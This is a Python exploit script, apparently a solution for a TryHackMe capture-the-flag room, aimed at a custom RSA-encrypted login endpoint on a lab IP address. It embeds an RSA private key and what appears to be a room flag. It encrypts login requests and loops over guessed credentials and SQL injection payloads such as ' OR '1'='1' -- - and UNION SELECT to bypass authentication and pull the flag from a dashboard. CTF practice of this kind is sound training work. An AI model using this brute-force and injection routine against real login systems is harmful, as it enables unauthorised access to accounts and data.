#!/usr/bin/env python3
import argparse
import base64
import json
import re
from urllib.parse import urlencode

import requests
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

SERVER_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvwpg2aBRLT9RftlcE8Qn
cmYi2weLT0EnHwXDsAE4A/zvR1dT9X4pFIrNXVnTKlIq8RBMilyoTn3GHUgJoFHG
GdqZfnCCHxf0IVX2NhpYi1HqZeXNCgqY4FtMH9WvjYEH2/twhUnvymT8egG3c50a
pT8sTsJrhWi2M+lhQ2yYXGecZHgAM7EddavpyTEdMw1xhIeeNHo1QxPjii1+dJIU
8iIJ8F3NQtukTe/EQyTjJGx7qDxVobO+njnnreqdqHZ6PqYD/6jlm9myXtUuJQqg
xMWwbxJNuS5Ay9JQSRGEfwEugJHuKEuofJdTkW/PibG9G3zaws4Nhmco8rw59j1r
bQIDAQAB
-----END PUBLIC KEY-----"""

CLIENT_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCHFhkwcfgZNVDe
KogLYzQSTTr8wgCi7WNepqeMuTTSXIX22SbzlK/gYlKtPPPxi2JzCkfa9VnTLsTd
3M4ZAL6d0rfo3L0KJ/SKMPq8VnGV9/y5YGyPmgbE1Dy8R2llP0m5GuO4giAoahZX
ePHsPbhNxtQuNW/EiGKcZaz5GQHILEQk2/0ZzqT0e/8jQMljpnbMUoGKe4yhT4JG
QGB7w7wPtQpFhDcASctUO8j3bcOL8tyrPfUcpNKFrkSNY0XT1gqnOuKe29YP0YnC
3bE/m5UPn7atBxP/4FrVRaQvM2S9ta+tZiDU5jP+xU3sBmMLlZByY5KiEeUGkvEz
FjfaMHihAgMBAAECggEAAMiqAvD721dW47Gh7EU+L/Of1afxZ5CeoaXQWcOoutZh
qn5tRHdAv6HJbJb6nESKkMvi0apoG+6g4r/PaDer63v1sEuw2v9jKta8uzlaD5B+
uGOG4LzQSI3J2A625dEImjLlxrAmXC6sqFN3zaboaAbg+/9IUabYEePRBYlhpEv7
jP9IquO6pO3q13gDhot0fS7MM4sTfYKdPfb8qEwYCpsz3Qi7lFdbBqZxz/O/tkPq
giNJNJnHBLmXNOIdSCocMldIhZaPMmcDODPXAehmrru7l/Kh5hnfdK7Njcoph5T4
EJqAPOU7XVSyBeJKiKj1x/S+2jzLn8s3hOKCiBbbwQKBgQC+IvSbRXVA16he1yBE
183VRAALdVRDDTZcFALaexuNfly2SMU9SL/AAFrbNMaQ83y79XtAbDqk8C6YRhyi
z2Il9puVu8G61UB2lWzD5DvDYbb4OS+AroluYZQzeR1+02sZUkR4R0QnfNRQUtMR
3awfBIgf9B6Kr90Dnn/OLmQrYQKBgQC14V2azqz4Nkg4bg1LLk612H2fhwz38Evj
mlMmxAxdIqGJUz+wGb3tSGmGz7fPxmIga9k8n22nMpfZOyyGF9D93LVa+/9NeFEV
DWH5yph+xBN7SSyQMb+Q1xD6gTigLmkIynUXzcucgZB8oUGtexR2IoFu3Li7R9F3
HYpUpsKVQQKBgQCFB3X20TEJbhm6SW+lWwwDY7FYUv3ib/MRl1qrvCh55eg+DUoa
57RpRJZM+m7XadRiuY1DdLXPQtCG778HVmvIPfN7XsNb0eppTYCsyhnaSJq4r2IB
+ZvkI9eJ7/poCsnLDJklQk94BUmS7XAJ9vt/NC99k9JunD7ZUmL/QcwJ4QKBgQCG
a812gJEt0VCHBC8nBU5+70XJBVL8W8h6qrAR0osguluQ1soXKK9KE16KmDJNiV00
gQDI4Tt1etrnXeiGIkv/k4Mlf2EsrGOgn4dtyeHyro+HaolY+KuQLKMLwT1MhYBz
Us4/jYWSYd+bfMLBqFlzBgWLHe4Z2/ZfhqGZ9rWRAQKBgGX7uHz9nUaldXxt4lBn
94FR8D6FJxyKGr0/35XrPE3gc1nDJIQGl62E9vk8eVuBsFgqhm2ISroRSxeRI6ml
djzuBNJ/gQ5hxhj7ifv1ZakiwvxR2D5uJBPU5gve19Fyrq5On6R+KvVR4b+vcZ5A
0HuYuUaGZhtLd9ouH49CvSXj
-----END PRIVATE KEY-----"""

FLAG_RE = re.compile(r"THM\{[^}]+\}", re.IGNORECASE)


def rsa_encrypt_pkcs1_v15(plain: bytes) -> str:
    pub = RSA.import_key(SERVER_PUBLIC_KEY_PEM)
    cipher = PKCS1_v1_5.new(pub)
    ct = cipher.encrypt(plain)
    return base64.b64encode(ct).decode("ascii")


def rsa_decrypt_pkcs1_v15(enc_b64: str) -> str:
    priv = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)
    cipher = PKCS1_v1_5.new(priv)
    ct = base64.b64decode(enc_b64)
    sentinel = b"__BAD_DECRYPT__"
    pt = cipher.decrypt(ct, sentinel)
    if pt == sentinel:
        return "<decryption failed>"
    return pt.decode("utf-8", errors="replace")


def do_login(session: requests.Session, base_url: str, username: str, password: str) -> tuple[int, str]:
    params = urlencode({"action": "login", "username": username, "password": password})
    encrypted = rsa_encrypt_pkcs1_v15(params.encode("utf-8"))
    payload = {"data": encrypted}

    resp = session.post(base_url.rstrip("/") + "/server.php", json=payload, timeout=15)
    status = resp.status_code

    try:
        body = resp.json()
    except Exception:
        return status, resp.text[:400]

    data = body.get("data")
    if not isinstance(data, str):
        return status, json.dumps(body)[:400]

    dec = rsa_decrypt_pkcs1_v15(data)
    return status, dec


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit key-based RSA login flow on port 80")
    parser.add_argument("--base", default="http://10.81.188.92:80", help="Base URL")
    args = parser.parse_args()

    candidates = [
        ("admin", "admin"),
        ("administrator", "admin"),
        ("ecorp_admin", "admin"),
        ("ecorp_admin", "password"),
        ("ecorp_admin", "THM{Breaking.Custom.Crypto.Is.Fun}"),
        ("ecorp_user", "THM{Breaking.Custom.Crypto.Is.Fun}"),
        ("test", "test"),
        ("' OR '1'='1' -- -", "x"),
        ("admin' -- -", "x"),
        ("ecorp_admin' -- -", "x"),
        ("' OR 1=1 -- -", "x"),
        ("' UNION SELECT 1,2,3 -- -", "x"),
        ("' OR ''='", "x"),
        ("\" OR \"1\"=\"1\" -- -", "x"),
    ]

    for user, pw in candidates:
        print(f"[*] Trying {user}:{pw}")
        with requests.Session() as session:
            status, text = do_login(session, args.base, user, pw)
        print(f"    HTTP {status}")
        print(f"    {text[:260]}")

        m = FLAG_RE.search(text)
        if m:
            print(f"\n[+] FLAG FOUND: {m.group(0)}")
            return

        if "Login successful" in text:
            dash = session.get(args.base.rstrip("/") + "/dashboard.php", timeout=15)
            dash_flag = FLAG_RE.search(dash.text)
            print(f"    dashboard.php -> HTTP {dash.status_code}")
            if dash_flag:
                print(f"\n[+] FLAG FOUND: {dash_flag.group(0)}")
                return

    print("\n[-] No flag in tested combos. Try more credentials or inspect decrypted messages for clues.")


if __name__ == "__main__":
    main()
